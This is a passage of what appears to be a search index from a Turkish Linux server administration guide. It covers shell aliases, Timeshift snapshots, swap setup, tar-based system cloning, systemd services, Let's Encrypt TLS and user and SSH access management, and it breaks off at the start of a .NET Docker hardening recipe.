~/.bashrc\nfi\n</code></pre>"},{"location":"how-to/shell-config/#pratik-ornekler","title":"\ud83d\udee0\ufe0f Pratik \u00d6rnekler","text":""},{"location":"how-to/shell-config/#1-production-server-icin-alias-seti","title":"1. Production Server \u0130\u00e7in Alias Seti","text":"<pre><code># ~/.bashrc\n\n# G\u00fcvenlik\nalias rm='rm -i'\nalias cp='cp -i'\nalias mv='mv -i'\n\n# Docker\nalias dps='docker ps --format \"table {{.Names}}\\t{{.Status}}\\t{{.Ports}}\"'\nalias dlogs='docker logs -f --tail 100'\nalias dstats='docker stats --no-stream'\n\n# Sistem\nalias ports='sudo netstat -tulpn | grep LISTEN'\nalias memtop='ps aux --sort=-%mem | head -10'\nalias cputop='ps aux --sort=-%cpu | head -10'\n\n# Log izleme\nalias nginx-log='tail -f /var/log/nginx/access.log'\nalias app-log='tail -f /var/log/myapp/app.log'\n\n# Disk\nalias diskspace='du -h --max-depth=1 | sort -hr'\nalias bigfiles='find . -type f -size +100M -exec ls -lh {} \\;'\n</code></pre>"},{"location":"how-to/shell-config/#2-development-environment","title":"2. Development Environment","text":"<pre><code># ~/.bashrc\n\n# Git\nalias gs='git status'\nalias gd='git diff'\nalias gl='git log --oneline --graph --all'\nalias gco='git checkout'\nalias gcb='git checkout -b'\n\n# Node.js\nexport NVM_DIR=\"$HOME/.nvm\"\n[ -s \"$NVM_DIR/nvm.sh\" ] &amp;&amp; \\. \"$NVM_DIR/nvm.sh\"\n\n# Python\nalias python=python3\nalias pip=pip3\nexport PATH=$PATH:$HOME/.local/bin\n\n# Proje k\u0131sayollar\u0131\nalias cdp='cd ~/projects'\nalias cdapi='cd ~/projects/api'\nalias cdfrontend='cd ~/projects/frontend'\n</code></pre>"},{"location":"how-to/shell-config/#3-sistem-yoneticisi-icin","title":"3. Sistem Y\u00f6neticisi \u0130\u00e7in","text":"<pre><code># ~/.bashrc\n\n# Servis y\u00f6netimi\nalias sysstart='sudo systemctl start'\nalias sysstop='sudo systemctl stop'\nalias sysrestart='sudo systemctl restart'\nalias sysstatus='sudo systemctl status'\n\n# Log analizi\nalias errors='sudo journalctl -p err -n 50'\nalias warnings='sudo journalctl -p warning -n 50'\n\n# Network\nalias myip='curl -s ifconfig.me'\nalias localip='hostname -I'\nalias openports='sudo ss -tulpn'\n\n# Backup fonksiyonu\nbackup_config() {\n    local file=$1\n    local backup_dir=\"/opt/backups/configs\"\n    sudo mkdir -p \"$backup_dir\"\n    sudo cp \"$file\" \"$backup_dir/$(basename $file).$(date +%Y%m%d_%H%M%S)\"\n    echo \"Backup: $backup_dir/$(basename $file).$(date +%Y%m%d_%H%M%S)\"\n}\n</code></pre>"},{"location":"how-to/shell-config/#troubleshooting","title":"\ud83d\udd0d Troubleshooting","text":""},{"location":"how-to/shell-config/#degisiklikler-yuklenmiyor","title":"De\u011fi\u015fiklikler Y\u00fcklenmiyor","text":"<pre><code># Syntax hatas\u0131 var m\u0131 kontrol et\nbash -n ~/.bashrc\n\n# Hata varsa detayl\u0131 g\u00f6ster\nbash -x ~/.bashrc\n\n# Manuel y\u00fckle\nsource ~/.bashrc\n</code></pre>"},{"location":"how-to/shell-config/#hangi-dosya-yukleniyor","title":"Hangi Dosya Y\u00fckleniyor?","text":"<pre><code># Login shell mi?\necho $0\n# -bash ise login shell\n\n# Hangi dosyalar y\u00fcklendi?\nset | grep BASH_SOURCE\n</code></pre>"},{"location":"how-to/shell-config/#alias-calsmyor","title":"Alias \u00c7al\u0131\u015fm\u0131yor","text":"<pre><code># Alias tan\u0131ml\u0131 m\u0131?\nalias myalias\n\n# Fonksiyon mu alias m\u0131?\ntype myalias\n\n# .bashrc y\u00fcklendi mi?\necho $BASH_VERSION\n</code></pre>"},{"location":"how-to/shell-config/#referanslar","title":"\ud83d\udcda Referanslar","text":"<ul> <li>Bash Manual</li> <li>Ubuntu Bash Startup Files</li> <li>RHEL Shell Configuration</li> </ul>"},{"location":"how-to/snapshots/","title":"Sistem Snapshot ve Geri Y\u00fckleme (Timeshift)","text":"<p>Sunucu y\u00f6netiminde en b\u00fcy\u00fck g\u00fcvence, bir \u015feyler ters gitti\u011finde \"zamanda geriye yolculuk\" yapabilmektir.</p> <p>Linux d\u00fcnyas\u0131nda bu i\u015fin standart arac\u0131 Timeshift'tir. Windows'taki \"System Restore\" veya macOS'teki \"Time Machine\" gibi \u00e7al\u0131\u015f\u0131r.</p>"},{"location":"how-to/snapshots/#1-timeshift-nedir","title":"1. Timeshift Nedir?","text":"<p>Timeshift, sistem dosyalar\u0131n\u0131n (kullan\u0131c\u0131 verileri DE\u011e\u0130L) anl\u0131k g\u00f6r\u00fcnt\u00fcs\u00fcn\u00fc al\u0131r.</p> <ul> <li>Kapsam: <code>/etc</code>, <code>/usr</code>, <code>/boot</code>, <code>/root</code> gibi sistem dizinleri.</li> <li>Hari\u00e7: <code>/home</code> (Kullan\u0131c\u0131 d\u00f6k\u00fcmanlar\u0131, web sitesi verileri).</li> </ul> <p>[!TIP] Veritaban\u0131 ve kullan\u0131c\u0131 verileri i\u00e7in <code>backup-db.sh</code> scriptini kullan\u0131n. Timeshift sisteminizi kurtar\u0131r, verilerinizi de\u011fil.</p>"},{"location":"how-to/snapshots/#2-kurulum-ve-mod-secimi-rsync-vs-btrfs","title":"2. Kurulum ve Mod Se\u00e7imi (RSYNC vs BTRFS)","text":"<p>\u00d6ncelikle dosya sisteminizi kontrol edin:</p> <pre><code>df -Th /\n</code></pre> \u00d6zellik RSYNC BTRFS H\u0131z Yava\u015f (dosya kopyalar) \u00c7ok h\u0131zl\u0131 (CoW - Copy on Write) Alan Fazla t\u00fcketir Minimal (Sadece de\u011fi\u015fen bloklar) Gereksinim T\u00fcm dosya sistemleri (EXT4) Sadece BTRFS"},{"location":"how-to/snapshots/#kurulum-ubuntudebian","title":"Kurulum (Ubuntu/Debian)","text":"<pre><code>sudo apt update\nsudo apt install timeshift -y\n</code></pre>"},{"location":"how-to/snapshots/#grub-entegrasyonu-kritik","title":"GRUB Entegrasyonu (Kritik!) \ud83d\udee1\ufe0f","text":"<p>Sistem hi\u00e7 a\u00e7\u0131lmazsa boot men\u00fcs\u00fcnden snapshot d\u00f6nmek i\u00e7in bu paketi mutlaka kurun:</p> <pre><code>sudo apt install timeshift-autosnap-apt -y\n</code></pre> <p>Bu paket her <code>apt upgrade</code> \u00f6ncesi otomatik snapshot al\u0131r.</p>"},{"location":"how-to/snapshots/#3-yaplandrma","title":"3. Yap\u0131land\u0131rma","text":"<p>\u0130lk \u00e7al\u0131\u015ft\u0131rmada yap\u0131land\u0131rma sihirbaz\u0131n\u0131 kullan\u0131n:</p> <pre><code>sudo timeshift --setup\n</code></pre>"},{"location":"how-to/snapshots/#manuel-komutla-snapshot","title":"Manuel Komutla Snapshot","text":"<pre><code># Snapshot al (Yorum eklemek \u00f6nemlidir)\nsudo timeshift --create --comments \"Update Oncesi Guvenlik\"\n</code></pre> <p>[!CAUTION] &gt; Disk Alan\u0131 Uyar\u0131s\u0131: RSYNC modu her snapshot i\u00e7in GB'larca alan t\u00fcketebilir! K\u00fc\u00e7\u00fck disklerde (20-40GB) maksimum 2-3 snapshot tutun.</p>"},{"location":"how-to/snapshots/#rotasyon-ayar-retention","title":"Rotasyon Ayar\u0131 (Retention)","text":"<p>Eski snapshot'lar\u0131n diski doldurmas\u0131n\u0131 \u00f6nlemek i\u00e7in <code>/etc/timeshift/timeshift.json</code> dosyas\u0131n\u0131 d\u00fczenleyin:</p> <pre><code>{\n  \"schedule_daily\": \"true\",\n  \"count_daily\": \"3\",\n  \"count_weekly\": \"2\",\n  \"count_monthly\": \"1\"\n}\n</code></pre>"},{"location":"how-to/snapshots/#4-geri-yukleme-restore","title":"4. Geri Y\u00fckleme (Restore)","text":"<p>Sistemi eski bir tarihe d\u00f6nd\u00fcrmek i\u00e7in:</p> <pre><code># 1. Mevcut snapshotlar\u0131 listele\nsudo timeshift --list\n\n# 2. \u0130nteraktif mod (Tarih se\u00e7imi men\u00fcs\u00fc)\nsudo timeshift --restore\n\n# 3. (Opsiyonel) Direkt belirli bir tarih\n# sudo timeshift --restore --snapshot \"2024-01-15_10-30-45\"\n</code></pre> <p>[!WARNING] Restore i\u015flemi canl\u0131 \u00e7al\u0131\u015fan sunucuda risklidir. M\u00fcmk\u00fcnse Rescue Mode veya Live CD \u00fczerinden yap\u0131lmas\u0131 daha sa\u011fl\u0131kl\u0131d\u0131r. Ancak sistem a\u00e7\u0131l\u0131yorsa CLI \u00fczerinden de denenebilir.</p>"},{"location":"how-to/snapshots/#5-hzl-kontrol-listesi-snapshot-oncesi","title":"5. H\u0131zl\u0131 Kontrol Listesi (Snapshot \u00d6ncesi)","text":"<p>Kritik bir i\u015flem yapmadan \u00f6nce:</p> <ul> <li>[ ] <code>df -h</code> \u2192 Yeterli disk alan\u0131 var m\u0131?</li> <li>[ ] <code>sudo timeshift --list</code> \u2192 Gerekirse eski snapshot'lar\u0131 (<code>--delete</code>) temizle.</li> <li>[ ] Veritaban\u0131 backup'\u0131 al\u0131nd\u0131 m\u0131? (<code>backup-db.sh</code>)</li> <li>[ ] Cloud panel snapshot'\u0131 al\u0131nd\u0131 m\u0131? (Kernel update ise)</li> </ul>"},{"location":"how-to/snapshots/#6-cloud-snapshots-en-guvenli-yontem","title":"6. Cloud Snapshots (En G\u00fcvenli Y\u00f6ntem)","text":"<p>E\u011fer sanal sunucu (VPS/Cloud) kullan\u0131yorsan\u0131z (AWS, Oracle, DigitalOcean), paneldeki Snapshot \u00f6zelli\u011fi Timeshift'ten \u00e7ok daha \u00fcst\u00fcnd\u00fcr.</p> <ul> <li>Tam \u0130maj: Diskin bit-bit kopyas\u0131n\u0131 al\u0131r.</li> <li>G\u00fcvenilirlik: %100 garantilidir. \u0130\u015fletim sistemi \u00e7\u00f6km\u00fc\u015f olsa bile kurtar\u0131r.</li> </ul> <p>\u00d6neri: Kritik update (Kernel, Docker s\u00fcr\u00fcm y\u00fckseltme) \u00f6ncesi mutlaka Cloud Provider panelinden Snapshot al\u0131n.</p>"},{"location":"how-to/swap/","title":"Swap Bellek Olu\u015fturma","text":"<p>Swap, RAM doldu\u011funda sistemin disk \u00fczerinde kulland\u0131\u011f\u0131 \"yedek bellek\" alan\u0131d\u0131r. \u00d6zellikle d\u00fc\u015f\u00fck RAM'li sunucularda (1-2GB) hayat kurtar\u0131r.</p>"},{"location":"how-to/swap/#ne-zaman-gerekir","title":"Ne Zaman Gerekir?","text":"<ul> <li>RAM &lt; 2GB: Mutlaka swap olu\u015fturun.</li> <li>RAM 2-4GB: \u00d6nerilir (\u00d6zellikle veritaban\u0131 \u00e7al\u0131\u015ft\u0131r\u0131yorsan\u0131z).</li> <li>RAM &gt; 8GB: Genellikle gerekli de\u011fil ama hibernation i\u00e7in kullan\u0131labilir.</li> </ul>"},{"location":"how-to/swap/#swap-boyutu","title":"Swap Boyutu","text":"<p>Genel kural:</p> <ul> <li>RAM \u2264 2GB \u2192 Swap = RAM x 2</li> <li>RAM &gt; 2GB \u2192 Swap = RAM (veya biraz daha az)</li> </ul>"},{"location":"how-to/swap/#olusturma-admlar","title":"Olu\u015fturma Ad\u0131mlar\u0131","text":""},{"location":"how-to/swap/#1-mevcut-swap-kontrolu","title":"1. Mevcut Swap Kontrol\u00fc","text":"<pre><code>free -h\n# Swap sat\u0131r\u0131 0 ise swap yok demektir\n</code></pre>"},{"location":"how-to/swap/#2-swap-dosyas-olustur","title":"2. Swap Dosyas\u0131 Olu\u015ftur","text":"<p>2GB swap i\u00e7in:</p> <pre><code># 2GB'l\u0131k bo\u015f dosya olu\u015ftur (Bu i\u015flem biraz s\u00fcrebilir)\nsudo fallocate -l 2G /swapfile\n\n# Alternatif (fallocate yoksa):\n# sudo dd if=/dev/zero of=/swapfile bs=1M count=2048\n</code></pre>"},{"location":"how-to/swap/#3-izinleri-ayarla","title":"3. \u0130zinleri Ayarla","text":"<p>Swap dosyas\u0131 sadece root taraf\u0131ndan okunabilir olmal\u0131 (g\u00fcvenlik):</p> <pre><code>sudo chmod 600 /swapfile\n</code></pre>"},{"location":"how-to/swap/#4-swap-alan-olarak-isaretle","title":"4. Swap Alan\u0131 Olarak \u0130\u015faretle","text":"<pre><code>sudo mkswap /swapfile\n</code></pre>"},{"location":"how-to/swap/#5-aktiflestir","title":"5. Aktifle\u015ftir","text":"<pre><code>sudo swapon /swapfile\n</code></pre> <p>Kontrol:</p> <pre><code>free -h\n# Art\u0131k Swap sat\u0131r\u0131nda 2GB g\u00f6rmelisiniz\n</code></pre>"},{"location":"how-to/swap/#6-kalc-hale-getir","title":"6. Kal\u0131c\u0131 Hale Getir","text":"<p>Sunucu yeniden ba\u015flad\u0131\u011f\u0131nda swap otomatik aktif olsun:</p> <pre><code>echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab\n</code></pre>"},{"location":"how-to/swap/#swappiness-ayar-opsiyonel","title":"Swappiness Ayar\u0131 (Opsiyonel)","text":"<p><code>swappiness</code>, sistemin ne kadar agresif swap kullanaca\u011f\u0131n\u0131 belirler (0-100).</p> <ul> <li>0: Sadece RAM tamamen doldu\u011funda swap kullan.</li> <li>60: Varsay\u0131lan (Biraz erken swap kullanmaya ba\u015flar).</li> <li>100: Her f\u0131rsatta swap kullan (\u00d6nerilmez).</li> </ul> <p>Sunucular i\u00e7in 10 de\u011feri idealdir:</p> <pre><code># Ge\u00e7ici (Reboot sonras\u0131 s\u0131f\u0131rlan\u0131r)\nsudo sysctl vm.swappiness=10\n\n# Kal\u0131c\u0131\necho 'vm.swappiness=10' | sudo tee -a /etc/sysctl.conf\n</code></pre>"},{"location":"how-to/swap/#swap-silme-ihtiyac-kalmadysa","title":"Swap Silme (\u0130htiya\u00e7 Kalmad\u0131ysa)","text":"<pre><code>sudo swapoff /swapfile\nsudo rm /swapfile\n# /etc/fstab'dan ilgili sat\u0131r\u0131 manuel silin\n</code></pre>"},{"location":"how-to/system-clone/","title":"Sistem Klonlama ve Ta\u015f\u0131ma (Tar Backup)","text":"<p>Sunucunuzun tamam\u0131n\u0131 tek bir s\u0131k\u0131\u015ft\u0131r\u0131lm\u0131\u015f dosya (<code>.tar.gz</code>) olarak indirip, donan\u0131m \u00f6zellikleri benzer (veya farkl\u0131) ba\u015fka bir sunucuya ta\u015f\u0131mak i\u00e7in bu y\u00f6ntemi kullanabilirsiniz.</p> <p>Bu y\u00f6ntem \"Bare Metal Restore\" veya \"System Migration\" olarak da adland\u0131r\u0131l\u0131r.</p>"},{"location":"how-to/system-clone/#1-yedekleme-backup","title":"1. Yedekleme (Backup)","text":"<p>T\u00fcm dosya sistemini ar\u015fivleyece\u011fiz. Ancak <code>/proc</code>, <code>/sys</code>, <code>/tmp</code> gibi dinamik veya ge\u00e7ici dizinleri hari\u00e7 tutmam\u0131z gerekir.</p> <p>Sunucuda root olarak \u00e7al\u0131\u015ft\u0131r\u0131n:</p> <pre><code># 1. Root'a ge\u00e7\nsudo -i\n\n# 2. Ar\u015fivi olu\u015ftur\n# --exclude: Gereksiz dizinleri atla\n# --one-file-system: Ba\u015fka diskleri/ba\u011flant\u0131lar\u0131 dahil etme\n# p: \u0130zinleri koru (preserve permissions)\ntar -cvpzf /tmp/server-full-backup.tar.gz \\\n    --exclude=/tmp/server-full-backup.tar.gz \\\n    --exclude=/proc \\\n    --exclude=/sys \\\n    --exclude=/dev \\\n    --exclude=/run \\\n    --exclude=/mnt \\\n    --exclude=/media \\\n    --exclude=/lost+found \\\n    --one-file-system \\\n    /\n</code></pre> <p>[!WARNING] Bu i\u015flem sunucu disk dolulu\u011funa g\u00f6re zaman alabilir. \u00c7\u0131kt\u0131 dosyas\u0131n\u0131n boyutunu <code>ls -lh /tmp/server-full-backup.tar.gz</code> ile kontrol edin.</p>"},{"location":"how-to/system-clone/#2-indirme-download","title":"2. \u0130ndirme (Download)","text":"<p>Olu\u015fan dosyay\u0131 kendi bilgisayar\u0131n\u0131za veya g\u00fcvenli bir depolama alan\u0131na \u00e7ekin.</p> <p>Kendi bilgisayar\u0131n\u0131zdan:</p> <pre><code>scp root@sunucu-ip:/tmp/server-full-backup.tar.gz ./yedekler/\n</code></pre>"},{"location":"how-to/system-clone/#3-geri-yukleme-restore","title":"3. Geri Y\u00fckleme (Restore)","text":"<p>Bu yede\u011fi yeni bir sunucuya y\u00fcklemek i\u00e7in, sunucuyu Rescue Mode veya Live CD/USB (Ubuntu/Debian installer) ile ba\u015flatman\u0131z gerekir.</p> <ol> <li>Yeni diskleri mount edin (\u00d6rn: <code>/mnt/yeni-disk</code>).</li> <li>Ar\u015fivi a\u00e7\u0131n:</li> </ol> <pre><code># Ar\u015fivi yeni diske a\u00e7\nsudo tar -xvpzf server-full-backup.tar.gz -C /mnt/yeni-disk --numeric-owner\n</code></pre>"},{"location":"how-to/system-clone/#4-kritik-ayarlar-grub-fstab","title":"4. Kritik Ayarlar (GRUB &amp; Fstab) \ud83d\udea8","text":"<p>Dosyalar\u0131 kopyalamak yetmez. Yeni diskin UUID'si (kimli\u011fi) eski diskten farkl\u0131d\u0131r. Bu y\u00fczden sistem a\u00e7\u0131lmaz (boot etmez).</p> <p>Chroot (Sanal K\u00f6k) Ortam\u0131na Ge\u00e7i\u015f:</p> <pre><code># Gerekli sistem dizinlerini ba\u011fla\nfor i in /dev /dev/pts /proc /sys /run; do sudo mount -B $i /mnt/yeni-disk$i; done\n\n# Sistemin i\u00e7ine gir\nsudo chroot /mnt/yeni-disk\n</code></pre> <p>\u0130\u00e7eride Yap\u0131lacaklar:</p> <ol> <li>Fstab G\u00fcncelleme: <code>/etc/fstab</code> dosyas\u0131ndaki eski UUID'leri silip, yeni diskin UUID'sini yaz\u0131n.<ul> <li>Yeni UUID'yi \u00f6\u011frenmek i\u00e7in: <code>blkid</code></li> </ul> </li> <li>GRUB Y\u00fckleme: <pre><code>update-grub\ngrub-install /dev/sda  # (Diskiniz /dev/vda veya nvme0n1 de olabilir)\n</code></pre></li> <li>\u00c7\u0131k\u0131\u015f: <pre><code>exit\nreboot\n</code></pre></li> </ol> <p>Tebrikler! Sunucunuz klonland\u0131. \ud83c\udf89</p>"},{"location":"how-to/systemd-service/","title":"Systemd Servis Tanimi","text":"<p>Bu rehber, uygulama icin systemd servis tanimlamayi kapsar.</p>"},{"location":"how-to/systemd-service/#servis-dosyasi","title":"Servis dosyasi","text":"<p><code>/etc/systemd/system/app.service</code>: <pre><code>[Unit]\nDescription=App Service\nAfter=network.target\n\n[Service]\nUser=deploy\nWorkingDirectory=/opt/app\nExecStart=/opt/app/start.sh\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n</code></pre></p>"},{"location":"how-to/systemd-service/#etkinlestirme","title":"Etkinlestirme","text":"<pre><code>systemctl daemon-reload\nsystemctl enable --now app\n</code></pre>"},{"location":"how-to/systemd-service/#dogrulama","title":"Dogrulama","text":"<ul> <li><code>systemctl status app</code> calisiyor mu?</li> <li>Restart politikasi beklenen gibi mi?</li> </ul>"},{"location":"how-to/tls/","title":"TLS (Let's Encrypt)","text":"<p>Bu rehber, Nginx uzerinde TLS sertifikasi kurulumunu kapsar.</p>"},{"location":"how-to/tls/#gereksinimler","title":"Gereksinimler","text":"<ul> <li>DNS kaydi hazir</li> <li>Nginx calisir durumda</li> </ul>"},{"location":"how-to/tls/#kurulum","title":"Kurulum","text":"<pre><code>apt install -y certbot python3-certbot-nginx\ncertbot --nginx -d example.com\n</code></pre>"},{"location":"how-to/tls/#otomatik-yenileme","title":"Otomatik yenileme","text":"<pre><code>systemctl status certbot.timer\n</code></pre>"},{"location":"how-to/tls/#dogrulama","title":"Dogrulama","text":"<ul> <li>HTTPS sertifikasi dogru mu?</li> <li>Yenileme zamanlayicisi aktif mi?</li> </ul>"},{"location":"how-to/tls/#sorun-olursa","title":"Sorun olursa","text":"<ul> <li>Yenileme problemleri icin: TLS Yenileme Sorunu</li> </ul>"},{"location":"how-to/user-management/","title":"Kullan\u0131c\u0131 Y\u00f6netimi","text":"<p>Sunucuda asla <code>root</code> kullan\u0131c\u0131s\u0131 ile g\u00fcndelik i\u015flem yapmay\u0131n. Her y\u00f6neticinin kendi kullan\u0131c\u0131 hesab\u0131 olmal\u0131d\u0131r.</p>"},{"location":"how-to/user-management/#1-kullanc-islemleri-lifecycle","title":"1. Kullan\u0131c\u0131 \u0130\u015flemleri (Lifecycle)","text":""},{"location":"how-to/user-management/#yeni-kullanc-ekleme","title":"Yeni Kullan\u0131c\u0131 Ekleme","text":"<p>Sadece kullan\u0131c\u0131 de\u011fil, home dizini ve varsay\u0131lan kabu\u011fu (bash) ile birlikte olu\u015fturur.</p> <pre><code>adduser yeni_kullanici\n# \u015eifre soracakt\u0131r. G\u00fc\u00e7l\u00fc bir \u015fifre belirleyin.\n# Di\u011fer sorular\u0131 ENTER ile ge\u00e7ebilirsiniz.\n</code></pre>"},{"location":"how-to/user-management/#kullanc-silme","title":"Kullan\u0131c\u0131 Silme","text":"<p>Kullan\u0131c\u0131y\u0131 ve dosyalar\u0131n\u0131 silmek i\u00e7in:</p> <pre><code>deluser --remove-home eski_kullanici\n</code></pre>"},{"location":"how-to/user-management/#2-yetkilendirme-gruplar","title":"2. Yetkilendirme (Gruplar)","text":""},{"location":"how-to/user-management/#sudo-yonetici-yetkisi","title":"Sudo (Y\u00f6netici) Yetkisi","text":"<p>Bir kullan\u0131c\u0131ya <code>sudo</code> komutunu kullanma hakk\u0131 vermek i\u00e7in onu <code>sudo</code> grubuna ekleyin.</p> <pre><code>usermod -aG sudo yeni_kullanici\n</code></pre>"},{"location":"how-to/user-management/#docker-yetkisi","title":"Docker Yetkisi","text":"<p>Her seferinde <code>sudo docker</code> yazmamak i\u00e7in:</p> <pre><code>usermod -aG docker yeni_kullanici\n# Etkili olmas\u0131 i\u00e7in kullan\u0131c\u0131n\u0131n \u00e7\u0131k\u0131\u015f yap\u0131p tekrar girmesi gerekir.\n</code></pre>"},{"location":"how-to/user-management/#3-hesap-guvenligi","title":"3. Hesap G\u00fcvenli\u011fi","text":""},{"location":"how-to/user-management/#hesab-kilitleme-lock","title":"Hesab\u0131 Kilitleme (Lock)","text":"<p>Bir personel i\u015ften ayr\u0131ld\u0131ysa veya \u015f\u00fcpheli i\u015flem varsa, hesab\u0131 silmeden kilitleyebilirsiniz.</p> <pre><code># Kilitle (Giri\u015f yapamaz)\npasswd -l hedef_kullanici\n\n# Kilidi A\u00e7\npasswd -u hedef_kullanici\n</code></pre>"},{"location":"how-to/user-management/#parola-degisimi-zorlama","title":"Parola De\u011fi\u015fimi Zorlama","text":"<p>Kullan\u0131c\u0131n\u0131n bir sonraki giri\u015finde parolas\u0131n\u0131 de\u011fi\u015ftirmesini istiyorsan\u0131z:</p> <pre><code>chage -d 0 hedef_kullanici\n</code></pre>"},{"location":"how-to/user-management/#sadece-ssh-key-parolasz","title":"Sadece SSH Key (Parolas\u0131z)","text":"<p>E\u011fer SSH hardening yapt\u0131ysan\u0131z (<code>PasswordAuthentication no</code>), kullan\u0131c\u0131 olu\u015fturduktan sonra onun i\u00e7in bir SSH key tan\u0131mlaman\u0131z gerekir.</p> <pre><code># Kullan\u0131c\u0131 ad\u0131na ge\u00e7i\u015f yap\nsu - yeni_kullanici\n\n# .ssh klas\u00f6r\u00fcn\u00fc olu\u015ftur\nmkdir .ssh\nchmod 700 .ssh\ntouch .ssh/authorized_keys\nchmod 600 .ssh/authorized_keys\n\n# Public key'i yap\u0131\u015ft\u0131r\nnano .ssh/authorized_keys\n</code></pre>"},{"location":"how-to/user-management/#4-kim-kimdir","title":"4. Kim Kimdir?","text":"<p>Sunucuda \u015fu an kimlerin oldu\u011funu veya ge\u00e7mi\u015fte kimlerin girdi\u011fini g\u00f6rmek i\u00e7in:</p> <pre><code># \u015eu an aktif olanlar\nw\n\n# Son giri\u015f yapanlar\nlast\n\n# Ba\u015far\u0131s\u0131z giri\u015f denemeleri\nlastb\n</code></pre>"},{"location":"how-to/user-management/#5-varsaylan-cloud-kullanclarn-opcubuntu-kapatma","title":"5. Varsay\u0131lan Cloud Kullan\u0131c\u0131lar\u0131n\u0131 (opc/ubuntu) Kapatma \ud83d\udee1\ufe0f","text":"<p>Oracle Cloud (<code>opc</code>), AWS (<code>ubuntu/ec2-user</code>) gibi sa\u011flay\u0131c\u0131lar size varsay\u0131lan bir kullan\u0131c\u0131 verir. G\u00fcvenlik i\u00e7in bu kullan\u0131c\u0131y\u0131 devre d\u0131\u015f\u0131 b\u0131rak\u0131p kendi kullan\u0131c\u0131n\u0131z\u0131 kullanmal\u0131s\u0131n\u0131z.</p>"},{"location":"how-to/user-management/#adm-1-yeni-admin-olusturun","title":"Ad\u0131m 1: Yeni Admin Olu\u015fturun","text":"<p>\u00d6nce kendinize bir kullan\u0131c\u0131 a\u00e7\u0131n ve sudo verin (B\u00f6l\u00fcm 1 ve 2'deki gibi).</p>"},{"location":"how-to/user-management/#adm-2-test-edin-cok-onemli","title":"Ad\u0131m 2: Test Edin (\u00c7ok \u00d6nemli!)","text":"<p>Yeni bir terminal a\u00e7\u0131p yeni kullan\u0131c\u0131 ile sunucuya giri\u015f yapabildi\u011finizi ve <code>sudo</code> komutu \u00e7al\u0131\u015ft\u0131rabildi\u011finizi do\u011frulay\u0131n. Asla test etmeden eski kullan\u0131c\u0131y\u0131 kapatmay\u0131n!</p>"},{"location":"how-to/user-management/#adm-3-ssh-erisimini-kstlayn-allowusers","title":"Ad\u0131m 3: SSH Eri\u015fimini K\u0131s\u0131tlay\u0131n (<code>AllowUsers</code>)","text":"<p>Bu en etkili y\u00f6ntemdir. Sadece sizin kullan\u0131c\u0131n\u0131z\u0131n SSH yapmas\u0131na izin verin.</p> <p><code>/etc/ssh/sshd_config</code> dosyas\u0131na ekleyin:</p> <pre><code># Sadece bu kullan\u0131c\u0131lara izin ver (Bo\u015flukla ay\u0131rabilirsiniz)\nAllowUsers yeni_kullanici baska_admin\n</code></pre> <p>SSH servisini yeniden ba\u015flat\u0131n: <code>sudo systemctl restart ssh</code></p>"},{"location":"how-to/user-management/#adm-4-varsaylan-kullancy-kilitleyin","title":"Ad\u0131m 4: Varsay\u0131lan Kullan\u0131c\u0131y\u0131 Kilitleyin","text":"<p>Kullan\u0131c\u0131y\u0131 silmek (<code>deluser</code>) bazen risklidir (Cloud-init scriptleri bu kullan\u0131c\u0131ya ba\u011fl\u0131 olabilir). Bunun yerine kilitlemek daha g\u00fcvenlidir.</p> <pre><code># 1. \u015eifresini kilitle\nsudo usermod -L opc\n\n# 2. Shell eri\u015fimini kapat (Giri\u015f yapamaz)\nsudo usermod -s /usr/sbin/nologin opc\n</code></pre> <p>Art\u0131k <code>opc</code> veya <code>ubuntu</code> kullan\u0131c\u0131s\u0131 ile sisteme giri\u015f yap\u0131lamaz.</p>"},{"location":"how-to/user-management/#6-kstl-kullanc-olusturma-gelistirici","title":"6. K\u0131s\u0131tl\u0131 Kullan\u0131c\u0131 Olu\u015fturma (Geli\u015ftirici) \ud83d\udc68\u200d\ud83d\udcbb","text":"<p>Bazen ekibe yeni kat\u0131lan bir geli\u015ftiriciye (junior) sunucu eri\u015fimi vermeniz gerekir ama y\u00f6netici (sudo) yetkisi olmas\u0131n\u0131 istemezsiniz.</p>"},{"location":"how-to/user-management/#adm-1-kullancy-olusturun","title":"Ad\u0131m 1: Kullan\u0131c\u0131y\u0131 Olu\u015fturun","text":"<pre><code># Sadece kullan\u0131c\u0131 olu\u015fturur. 'sudo' grubuna eklemedi\u011finiz i\u00e7in YETK\u0130S\u0130ZD\u0130R.\nsudo adduser mehmet\n</code></pre>"},{"location":"how-to/user-management/#adm-2-ssh-izni-verin","title":"Ad\u0131m 2: SSH \u0130zni Verin","text":"<p>E\u011fer <code>AllowUsers</code> kullan\u0131yorsan\u0131z (ki kullanmal\u0131s\u0131n\u0131z), bu kullan\u0131c\u0131y\u0131 listeye ekleyin:</p> <p><code>/etc/ssh/sshd_config</code>:</p> <pre><code># Hem admin hem de geli\u015ftiriciye izin ver\nAllowUsers admin_user mehmet\n</code></pre> <p>Sonra servisi yeniden ba\u015flat\u0131n: <code>sudo systemctl restart ssh</code></p>"},{"location":"how-to/user-management/#adm-3-ssh-anahtarn-ekleyin","title":"Ad\u0131m 3: SSH Anahtar\u0131n\u0131 Ekleyin","text":"<p>B\u00f6l\u00fcm 3'teki \"Sadece SSH Key\" ad\u0131mlar\u0131n\u0131 uygulay\u0131n.</p>"},{"location":"how-to/user-management/#adm-4-test-dogrulama","title":"Ad\u0131m 4: Test (Do\u011frulama)","text":"<p>Mehmet kullan\u0131c\u0131s\u0131 ile giri\u015f yap\u0131n ve <code>sudo</code> komutunu deneyin.</p> <pre><code>ssh mehmet@sunucu\nmehmet@server:~$ sudo apt update\n[sudo] password for mehmet:\nmehmet is not in the sudoers file. This incident will be reported. \ud83d\udeab\n</code></pre> <p>Bu hatay\u0131 al\u0131yorsan\u0131z i\u015flem ba\u015far\u0131l\u0131d\u0131r. Kullan\u0131c\u0131 sadece kendi ev dizininde i\u015flem yapabilir, sistem ayarlar\u0131n\u0131 bozamaz.</p>"},{"location":"recipes/dotnet/","title":".NET Core Docker Hardening \ud83d\udd37","text":"<p>Microsoft, .NET 8 ile birlikte konteyner g\u00fcvenli\u011finde devrim yapt\u0131. Art\u0131k \"Chiseled\" (yontulmu\u015f) Ubuntu imajlar\u0131 sayesinde, i\u00e7inde shell (bash/sh) bile olmayan ultra-g\u00fcvenli image'lar kullanabiliyoruz.</p>"},{"location":"recipes/dotnet/#1-onerilen-dockerfile-chiseled","title":"1. \u00d6nerilen Dockerfile (Chiseled) \ud83c\udfc6","text":"<p>Bu Dockerfile, sald\u0131rgan i\u00e7eri 